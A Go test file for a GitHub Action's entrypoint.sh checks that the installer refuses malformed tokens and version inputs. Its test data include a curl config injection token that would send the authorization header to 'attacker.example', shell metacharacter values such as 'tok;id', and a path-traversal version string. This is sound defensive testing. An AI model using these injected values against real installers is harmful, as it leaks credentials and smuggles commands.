//go:build linux

// Package action tests the composite Action's entrypoint.sh directly, without a
// runner, root or network. Unlike the e2e suite in ./test (root + real kernel,
// behind the e2e build tag), it runs under the default `go test`.
package action

import (
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func entrypointPath(t *testing.T) string {
	t.Helper()
	p, err := filepath.Abs(filepath.Join("..", "..", "entrypoint.sh"))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(p); err != nil {
		t.Fatalf("entrypoint.sh not found: %v", err)
	}
	return p
}

// runInstall runs `entrypoint.sh install` hermetically: a temp RUNNER_TEMP, HOME
// and GITHUB_PATH, and every proxy variable pointed at a closed local port, so an
// accidental network call fails fast instead of reaching GitHub.
func runInstall(t *testing.T, token string) (string, int) {
	t.Helper()
	return runInstallVersion(t, token, "latest")
}

func runInstallVersion(t *testing.T, token, version string) (string, int) {
	t.Helper()
	dir := t.TempDir()
	cmd := exec.Command("bash", entrypointPath(t), "install")
	cmd.Env = []string{
		"PATH=" + os.Getenv("PATH"),
		"HOME=" + dir,
		"RUNNER_TEMP=" + dir,
		"GITHUB_PATH=" + filepath.Join(dir, "github_path"),
		"EGRET_VERSION=" + version,
		"EGRET_GITHUB_TOKEN=" + token,
		"https_proxy=http://127.0.0.1:9", "HTTPS_PROXY=http://127.0.0.1:9",
		"http_proxy=http://127.0.0.1:9", "HTTP_PROXY=http://127.0.0.1:9",
	}
	out, err := cmd.CombinedOutput()
	var ee *exec.ExitError
	switch {
	case err == nil:
		return string(out), 0
	case errors.As(err, &ee):
		return string(out), ee.ExitCode()
	default:
		t.Fatalf("running entrypoint: %v", err)
		return "", -1
	}
}

// A github-token outside the token alphabet must fail the install closed, with a
// message that names the real cause. It reaches curl through a config file, where
// a quote plus a newline would start new curl directives (for example `url =`,
// which would send the Authorization header to another host). Before the fix, the
// rejection happened inside a $(... | parse_tag_name) pipeline, so the error was
// swallowed and the user saw a misleading rate-limit hint instead.
func TestInstallRejectsMalformedToken(t *testing.T) {
	for name, tok := range map[string]string{
		"curl directive injection": "abc\"\nurl = \"https://attacker.example/",
		"embedded space":           "abc def",
		"backslash escape":         `abc\n`,
		"shell metacharacters":     "tok;id",
	} {
		t.Run(name, func(t *testing.T) {
			out, code := runInstall(t, tok)
			if code != 1 {
				t.Fatalf("exit code = %d, want 1\n%s", code, out)
			}
			if !strings.Contains(out, "outside the expected token alphabet") {
				t.Errorf("missing the real cause in output:\n%s", out)
			}
			if strings.Contains(out, "rate limit") {
				t.Errorf("shows the misleading rate-limit hint:\n%s", out)
			}
		})
	}
}

// validTokenFunc extracts the valid_token shell function from entrypoint.sh, so
// the test exercises the exact shipped code rather than a copy of the regex.
func validTokenFunc(t *testing.T) string {
	t.Helper()
	src, err := os.ReadFile(entrypointPath(t))
	if err != nil {
		t.Fatal(err)
	}
	s := string(src)
	start := strings.Index(s, "valid_token() {")
	if start < 0 {
		t.Fatal("valid_token() not found in entrypoint.sh")
	}
	end := strings.Index(s[start:], "\n}\n")
	if end < 0 {
		t.Fatal("end of valid_token() not found")
	}
	return s[start : start+end+2]
}

// Real token shapes must pass, or every user who sets github-token breaks.
// Anything that could reshape a curl config line must fail.
func TestValidTokenAlphabet(t *testing.T) {
	fn := validTokenFunc(t)
	for tok, want := range map[string]bool{
		"ghs_16C7e42F292c6912E7710c838347Ae178B4a":                       true, // installation token / GITHUB_TOKEN
		"ghp_abcdefghijklmnopqrstuvwxyz0123456789":                       true, // classic PAT
		"github_pat_11ABCDEFG0_abcdefghijklmnopqrstuvwxyz0123456789ABCD": true, // fine-grained PAT
		"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxIn0.c2lnbmF0dXJl-_":            true, // JWT shape
		"abc\"\nurl = \"https://attacker.example/":                       false,
		"abc def": false,
		`abc\n`:   false,
		"tok;id":  false,
		"tok\r":   false,
		"":        false,
	} {
		err := exec.Command("bash", "-c", fn+"\nvalid_token \"$1\"", "_", tok).Run()
		if got := err == nil; got != want {
			t.Errorf("valid_token(%q) = %v, want %v", tok, got, want)
		}
	}
}

// The version input goes into release download URLs. Anything but a release tag
// (or "latest") is refused before any download, so "../.." cannot point curl at
// another repository's release.
func TestInstallRejectsAMalformedVersion(t *testing.T) {
	for _, v := range []string{"../../attacker/repo/releases/download/v1.0.0", "v1.0", "main", "v1.0.0;id", "v1.0.0-rc1"} {
		t.Run(v, func(t *testing.T) {
			out, code := runInstallVersion(t, "", v)
			if code != 1 || !strings.Contains(out, "version must be 'latest' or a release tag") {
				t.Fatalf("exit %d, want 1 with the version error:\n%s", code, out)
			}
			if strings.Contains(out, "Downloading") {
				t.Errorf("tried to download before validating:\n%s", out)
			}
		})
	}
}
